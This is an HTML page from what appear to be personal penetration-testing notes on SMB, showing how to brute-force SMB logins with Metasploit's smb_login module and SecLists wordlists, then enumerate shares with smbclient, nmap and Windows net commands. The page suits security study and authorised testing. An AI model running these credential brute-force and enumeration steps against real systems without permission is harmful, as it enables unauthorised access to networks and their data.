<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NetBIOS, SMB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NetBIOS, SMB</h1><br/>Windows file sharing explanation here: <strong> </strong><a href="_for_a_Pentester--networking--protocols--protocol_layers--IP_protocol_suite_(TCP-IP)--Transport_Layer--Ports--services---p137,139_NetBIOS.html">NetBIOS</a><strong> </strong>and <a href="e_Basics_for_a_Pentester--networking--protocols--protocol_layers--IP_protocol_suite_(TCP-IP)--Transport_Layer--Ports--services---p445_SMB.html">SMB</a><br />Vulnerability Testing â†’  <a href="Penetration_Testing--Penetration_Test_Methodology--Network_Pentest--Vulnerability_assessment--Manual_Testing--NetBIOS,_SMB.html">Here</a><br /><br /><strong><h3>Bruteforce Login</h3></strong><br />If we want to try to bruteforce the credentials for SMB login, we can use the metasploit module: auxiliary/scanner/smb/smb_login<br /><div class="codebox"><div class="codebox">msfconsole<br />use&nbsp;auxiliary/scanner/smb/smb_login</div></div><br /><br />set Password list from Seclists(<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>)<br /><div class="codebox"><div class="codebox">set&nbsp;PASS_FILE&nbsp;/usr/share/seclists/Passwords/Common-Credentials/best15.txt</div></div><br /><br />set User list from Seclists(<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>)<br /><div class="codebox"><div class="codebox">set&nbsp;USER_FILE&nbsp;/usr/share/seclists/Usernames/top-usernames-shortlist.txt</div></div><br /><br />set IP Address of the target host<br /><div class="codebox"><div class="codebox">&nbsp;set&nbsp;RHOSTS&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>IP_Address<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /><br /><div class="codebox"><div class="codebox">run</div></div><br /><br /><a href=""><img src="images/689-1.png" alt="images/689-1.png" /></a><br />Found Administrator credentials!<br />Username: administrator<br />Password: password<br /><br /><strong><h3>Enumerate the Shares</h3></strong><br />Once we have found the credentials by bruteforce we can enumerate the shares<br />Linux(better!):<br /><div class="codebox"><div class="codebox">smbclient&nbsp;-L&nbsp;&lt;IP_Address&gt;&nbsp;--user=&lt;username&gt;%&lt;password&gt;&nbsp;&nbsp;&nbsp;&nbsp;#Linux</div></div><br /><div class="codebox"><div class="codebox">nmap&nbsp;-script=smb-enum-shares&nbsp;--script-args&nbsp;smbusername=&lt;username&gt;,smbpass=&lt;password&gt;&nbsp;&lt;IP_Address&gt;&nbsp;-p445&nbsp;&nbsp;&nbsp;&nbsp;#Linux</div></div><br />Windows:<br /><div class="codebox"><div class="codebox">net&nbsp;use&nbsp;\\&lt;IP_Address&gt;\IPC$&nbsp;&lt;password&gt;&nbsp;/u:&lt;username&gt;<br />net&nbsp;view&nbsp;\\<span style="color:#000000;font-weight:400">&lt;</span>IP_Address<span style="color:#000000;font-weight:400">&gt;</span></div></div></div>
</body>
</html>
